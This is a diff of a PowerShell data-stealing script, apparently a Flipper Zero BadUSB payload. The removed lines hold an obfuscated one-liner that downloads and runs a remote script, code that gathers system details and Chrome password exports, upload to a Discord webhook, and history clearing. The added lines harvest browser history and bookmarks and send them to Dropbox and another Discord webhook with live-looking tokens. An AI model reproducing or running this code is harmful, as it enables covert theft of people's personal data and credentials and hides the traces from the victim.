@@ -1,47 +1,102 @@
-#Payload to execute in your flipperZero: this dowload, execute and clear history
-#$n='i';set-alias v $n'wr';$b=[char]116;$c=[char]47;$a=$([char]104+$b+$b+[char]112+[char]58+$c+$c);IEX (v -usebasicparsing $a'raw.githubusercontent.com/s4dic/DiscordGrabber/main/bd.ps1?token=GHSAT0AAAAAABXCYHCCGGWFF43MHDED24HEYXT6JBQ'); PSReadLine; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory(); exit
+function Get-BrowserData {
 
-#Todo:
-# Correct the Edge password error
+    [CmdletBinding()]
+    param (	
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$Browser,    
+    [Parameter (Position=1,Mandatory = $True)]
+    [string]$DataType 
+    ) 
 
-#CHANGE URL TO YOUR URL
-  $url="https://discordapp.com/api/webhooks/1073986113166905364/y0pF_Wsr4RR__Fi0IcFO3FK8-tbR7ElRM6rN7YqC56O4d2b_5DfY6EzrW9wSPzRYZ7IG" ;
-#Get PC Name+Date+Time
-  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
+    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
 
-  
-# Get PC information
-  dir env: >> "$env:temp\stats-$namepc.txt";
-# Get public IP
-  $pubip = (Invoke-WebRequest -UseBasicParsing -uri "http://ifconfig.me/").Content
-  echo "PUBLIC IP: $pubip" >> "$env:temp\stats-$namepc.txt";
-# Get Local IP
-  ipconfig /all >> "$env:temp\stats-$namepc.txt";
-# List all installed Software
-  echo "Installed Software:" >> "$env:temp\stats-$namepc.txt";
-  Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
-  Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize >> "$env:temp\stats-$namepc.txt";
+    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
+    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
+    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
+    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
+    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}
+
+    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
+    $Value | ForEach-Object {
+        $Key = $_
+        if ($Key -match $Search){
+            New-Object -TypeName PSObject -Property @{
+                User = $env:UserName
+                Browser = $Browser
+                DataType = $DataType
+                Data = $_
+            }
+        }
+    } 
+}
+
+Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP--BrowserData.txt
+
+Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
+
+Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
+
+# Upload output file to dropbox
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "https://discordapp.com/api/webhooks/1073990210255335544/nY9gL-V-wqTMADAofv3buh8IbGh-KC3AUiDjOTJFgl_uW7T9sI-GgaqU1sPMjUTKMY9i"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
 
 
-#Define zip to copy
-$chromepassword = "$env:temp\export.htm"
-
-#UPLOAD
-cd $env:temp
-# Send Name Computer to discord
-  $Body=@{ content = "**Nazwa użytkownika:** $env:UserName, Nazwa komputera: $env:computername"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-# Upload Stat
-  curl.exe -F "file1=@stats-$namepc.txt" $url;
-
-# Upload Webbroser Password Pwned
-  $Body=@{ content = "**Hasla z komputera**"};
-  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-# Upload chrome password
-  curl.exe -i -F file=@"$chromepassword" $url
-
-# Clear History powershell:
-  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
-# Clear run powershell:
-  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
-exit;
+############################################################################################################################################################
+RI $env:TEMP/--BrowserData.txt
